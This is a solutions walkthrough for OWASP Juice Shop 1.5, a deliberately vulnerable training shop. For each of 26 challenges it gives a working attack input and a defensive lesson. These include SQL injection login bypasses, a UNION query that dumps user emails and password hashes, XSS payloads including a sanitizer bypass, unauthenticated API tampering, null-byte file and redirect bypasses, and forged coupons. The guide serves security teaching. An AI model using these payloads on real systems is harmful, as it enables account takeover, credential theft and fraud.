# Solutions (JuiceShop 1.5)

The following sections contain the solution for all tasks. For each task there is an extra section. Please note that in some case there might be other ways to achive the goal. This applies especially to tasks where SQL injection comes in place.

## 1. "Find the carfully hidden 'Score Board' page."

### Solution
The scoreboard can be found at http://ip:port/#/score-board

### Explanation
The information where the scoreboard can be found comes from the HTML source text. Here you‘ll find the line:

```html
<!--
   <li class="dropdown">
     <a href="#/score-board">Score Board</a>
   </li>
-->
```

### Lessons learned
Passages that are commented after debug phases should be removed prior to any deployment. This is especially so, when they are application parts that are returned externally (e.g. HTML, CSS, JavaScript, etc.).






## 2. "Provoke an error that is not very gracefully handled."

### Solution
When logging on as email, simply use: '.

### Explanation
The application is vulnerable to injection attacks (see OWASP Top 10: A1).
Data entered by the user is integrated 1:1 in an SQL command that is otherwise constant. The can then be amended/extended as appropriate. Changing the SQL code can also provoke errors that provide specific details of the structure of the database or the command.


### Lessons learned
User input should always be subject to a sanitizing or validation process on the server side before being processed. Because this case deals with an SQL injection, input data should be adjusted server side by interpretable SQL symbols and instructions. Established functions should be used for this not in-house developments (e.g. self-generated RegEx), because this cannot ensure that all cases have been taken into consideration. In addition, adequate error handling should be implemented that does not give the user technical errors.





## 3: "Log in with the administrator's user account."

### Solution
When logging on as email use:
```sql
' or 1=1;--
```
Any password can be selected.

*(Note: This is one possible solutions. There are several ways to achieve the goal.)*

### Explanation
The application is vulnerable to injection attacks (see OWASP Top 10: A1).
Data entered by the user is integrated 1:1 in an SQL command that is otherwise constant. The statement can then be amended/extended as appropriate.
The Administrator is the first to appear in the selection list and is therefore logged on.

### Lessons learned
User input should always be subject to a sanitizing or validation process on the server side before being processed. Because this case deals with an SQL injection, input data should be adjusted server side by interpretable SQL symbols and instructions. Established functions should be used for this not in-house developments (e.g. self-generated RegEx), because this cannot ensure that all cases have been taken into consideration.





## 4: "Log in with Jim's user account."

### Solution
When logging on as email use:

```sql
' or 1=1 and email not like('%admin%');--
```
Any password can be selected.

*(Note: This is one possible solutions. There are several ways to achieve the goal.)*

### Lessons learned
See Task 3





## 5: "Log in with Bender's user account."


### Solution

When logging on as email use:
```sql
' or 1=1 and email like('%bender%');--
```
Any password can be selected.

*(Note: This is one possible solutions. There are several ways to achieve the goal.)*

### Lessons learned

The application is vulnerable to injection attacks (see OWASP Top 10: A1).
Data entered by the user is integrated 1:1 in an SQL command that is otherwise constant. They can then be amended/extended as appropriate. The selection list is restricted this time to the user "bender". If there are several users with the letter combination "bender" in the email address, the call will need to be modified.






## 6: "XSS Tier 1: Perform a reflected XSS attack with <script>alert("XSS1")</script>."

### Solution

Enter
```javascript
<script>alert("XSS1")</script>
```
 in the search field.

### Explanation

The application is vulnerable for reflected XSS because user input is returned 1:1 by the application just as the user entered it.

### Lessons learned

User input should always be sanitized before being output again because otherwise any content can be injected.





## 7: "XSS Tier 2: Perform a persisted XSS attack with <script>alert("XSS2")</script>  bypassing a client-side security mechanism."

### Solution

Add a new user with a POST to /api/Users and
```json
{"email": "<script>alert(\"XSS2\")</script>", "password":""}
```
as a JSON object.

### Explanation

The email address is checked on the client side using JavaScript. There is no further check on the server side. By addressing the API directly, client side protection can be circumvented.

### Lessons learned

- Sanitize both input and output.
- Always sanitize data where it is transferred to one's own area of responsibility.
- Never rely on filter mechanisms that can be potentially changed or circumvented.



## 8: "XSS Tier 3: Perform a persisted XSS attack with <script>alert("XSS3")</script> bypassing a server-side security mechanism."

### Solution

Post
```html
<<script>alert("XSS3")</script>script>alert("XSS3")<</script>/script>
```
as feedback.


### Explanation

A legacy library (sanitize-html 1.4.2) is used on the server that is responsible for sanitizing. The version used is vulnerable to masking attacks because no recursive sanitizing takes place.



### Lessons learned

Always use updated libraries
Regularly update libraries to avoid know vulnerabilities being exploited



## 9: "XSS Tier 4: Perform a persisted XSS attack with <script>alert("XSS4")</script> without
     using the frontend application at all."

### Solution

```
PUT /api/Products/9 HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 108

{
 "id":9,
 "name":"",
 "description":
 "<script>alert(\"XSS4\")</script>",
 "price":0.01,
 "image":"owasp_osaft.jpg"
}
```


### Explanation

The application processes PUT calls without taken account of authentication or authorisation.
On top of this, there is no output sanitizing.





## 10: "Retrieve a list of all user credentials via SQL Injection."

### Solution

Run an SQL injection in the search field:

```sql
ö') union select 1,email,password,4,5,6,7 from users;--
```

The Union has to have the same number of columns as the select from the first part. Columns 2 and 3 come from the database, the rest can remain constant. This only helps the ensure the legibility of the data on the page because columns 2 and 3 are displayed in text form.

Alternatively, the URL
```
http://ip:port/rest/product/search?q=a')%20union%20select%20email,%20password,%203,%204,%205,%206,%207%20from%20users;--
```
can be executed. This directly addresses the web service.

### Explanation
See task 2

### Lessons learned
See task 2




## 11: "Log in with the administrator's user credentials without previously changing them or applying SQL Injection."


### Solution

User credentials have been gained from Task 10.
Passwords are hashed with MD5.
A Google search for the administrator's hash takes you to md5cracker.org, for instance, where you can read the password in clear text (admin123). Alternatively, you can proceed as in Task 20.

### Explanation

Unsalted hashes are used for the persistence of passwords. These can be easily reversed using rainbow tables. Especially when the password is easy and it is highly likely to appear in such a table.

### Lessons learned

No unsalted hashes should be used. What's more, MD5 is a cryptographic hash optimised for speed. In terms of security, however, the idea is that an attacker will need as long as possible. This is why you should use an algorithm optimised for security, such as bcrypt, scrypt or PBKDF2, for example.





## 12: "Get rid of all 5-star customer feedback."

### Solution

The relevant feedbacks can be removed in the admin section *(http://ip:port/#/administration)*

### Explanation
The admin interface is freely available. Even users not logged on a admin can run actions on the administrative interface.

### Lessons learned

Set up a rigorous plan for roles and rights
Make the admin interface only available internally wherever possible and not accessible from the public network








## 13: "Post some feedback in another user's name."

### Solution
Intercept the request to post feedback when logged on.
The request contains the following information:
```json
{"UserId":2,"rating":2,"comment":"1"}
```
The User ID can be changed and the request left as is.

### Explanation
There is no further authentication on the server.


### Lessons learned
Authentication should be necessary to be able to write personalised comments.







## 14: "Wherever you go, there you are."

### Solution
When placing an order, a payment variation can be selected.
Here can be seen that the shop has build in a redirect function: * http://baseurl/redirect?to=*

This appears to maintain a whitelist

Requesting 
``` 
http://baseurl/redirect?to=https://google.de%00https://gratipay.com/bkimminich
```
solves the challenge



### Explanation
The whitelist logic has been improperly implemented and vulnerable to NULL byte injection.


### Lessons learned
NULL bytes are rarely needs in reality. In the context of this redirect function they are not necessary and can generally be filtered out, for example.









## 15: "Access someone else's basket."

### Solution
Simply do GET request to /rest/basket/x (x=BasketID which is not your own)

### Explanation
There is no authentication on the server.

### Lessons learned
Access to a basket should be secured through authentication.




## 16: "Place an order that makes you rich."

### Solution
Intercept a request to change the amount of a product in the basket.
The request supplies information on the amount. This can be changed to a negative value, e.g.:
```json
{"quantity": -500}
```
Afterwards, the request can be executed. Finally complete the order.

### Explanation
On the server side, values received are not checked for their plausibility.

### Lessons learned
All data send from the client should be questioned and checked on the server. This also applies to fields that can actually only accept certain values (e.g. combo boxes, selection lists, etc), which can be changed at certain positions by experienced users.



## 17: "Access a confidential document."

### Solution

- From Task 16 you can see where the calculation has been stored (http://ip:port/ftp)
- Other files are stored in this directory too
- Task is fulfilled when you download acquisitions.md


## 18: "Access a forgotten backup file."

### Solution

From Task 16 you can see where the calculations have been stored (http://ip:port/ftp)
In this directory you will also find the back-up files with the extension .bak

It is not possible to download files with extensions other than .md and .pdf.

Inserting a NULL byte and a permitted extension helps:
```
http://ip:port/ftp/coupons_2013.md.bak%2500.md
```

The percent sign for the NULL byte in the URL has to be encoded itself (%25 = %)

### Explanation
The application (internal routing) is vulnerable for NULL byte injection.


### Lessons learned

NULL bytes are rarely needed in reality. They could be filtered out, for example.



## 19: "Access the administration section of the store."

### Solution
The Admin section can be found at http://ip:port/#/administration.

### Explanation
The admin interface is freely available. The URL for this is easy to guess.

### Lessons learned
Set up a rigorous plan for roles and rights. Make the admin interface only available internally wherever possible and not accessible from the public networks.



## 20: "Change Bender's password into slurmCl4ssic."

### Solution
- Logon on as Bender (see Task 5)
- A token is stored in the cookie
- This must be Base64 decoded
- Now you can see a JSON string :

```json
{"status":"success","data":{"id":3,"email":"bender@juice-sh.op","password":"fa3360bfd5e190cb65a113c198dfa164","createdAt":"2015-09-03 05:24:11.000 +00:00","updatedAt":"2015-09-03 05:24:11.000 +00:00"}
```

The "password" field contains the user's password as an MD5 hash. A Google search for the administrator's hash takes you to md5cracker.org where you can read the password in clear text ("booze")
Using this password, the user's password can be set to slurmCl4ssic using the normal "Change password" function.


### Explanation
See Task 10

### Lessons learned
See Task 10. In addition, sensitive information such as a password should not be found in a cookie and be capable of being transferred at every request.




## 21: "Change the link in the description of the O-Saft product to http://kimminich.de."

### Solution
The task can be solved by sending the following request:

```
PUT /api/Products/9 HTTP/1.1
Host: xxxxx
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 350

{  
   "id":9,
   "name":"OWASP SSL Advanced Forensic Tool(O-Saft)",
   "description":
   "<a href=\"http://kimminich.de\" target=\"_blank\">
   More...</a>",
   "price":0.01,
   "image":"owasp_osaft.jpg"
}
```

### Explanation
The application processes PUT calls without taken account of authentification or authorisation.





## 22: "Inform the shop about a vulnerable library it is using."

### Solution
Write a message in the contact form that contains "sanitize-html 1.4.2".

### Explanation

The version of sanitize-html used is vulnerable to masking attacks. See also: https://github.com/punkave/sanitize-html/issues/29



## 23: "Inform the shop about an algorithm or library it should definitely not use the way it does."

### Solution

Write a commentary that contains one of the following three algorithms:

- z85
- base85
- rot13


### Lessons learned

See Task 25





## 24: "Find the hidden Easter egg."

### Solution
Similarly to Task 18, the easteregg file can be downloaded.



## 25: "Apply some advanced cryptanalysis to find the real Easter egg."

### Solution
In the Easter egg file there is a Base64 encoded string:
```
L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==
```

Decoded it's:
```
/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
```

This has been Rot13 encoded. Using a Rot13 Decoder, the following text appears:
```
/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
```

Launching the URL (Base-URL+secret) solves the task and you will get a fancy gimmick.


### Explanation
Decoding procedures are used that are actually intended for obscuring or encoding text.


### Lessons learned
If something should really stay secret, use standardised procedures suited to encoding and which cannot be broken based on the current state of technology. In-house developments are to be avoided – cryptography is not a trivial issue.



## 26: "Forge a coupon code that gives you a discount of at least 80%."

### Solution
Invalid coupons can be found in and downloaded from the FTP directory (see Task 18). With a little investigation one may notice that the coupons IDs are z85 encoded. Decoded they reveal the following format: MMMYY-VV -> SEP13-10, in which VV (10) is the percent deducted.

Using a z85 Encoder you can make you own coupon. It just has to be amended to the current date; e.g. on 21/09/2015 it has to be: SEP15-81.

The order must be placed to pass the challenge.


### Explanation
The security of coupons is generated by the secrecy of the procedure. With a little bit of research and the information from the FTP file (tasks 16/17) you can reconstruct just how the coupon code works and how to create a new coupon.


### Lessons learned
- Security through obscurity is not recommended
- Use established procedures
- Coupons should be issued and invalidated
- A "standalone algorithm" is not suitable
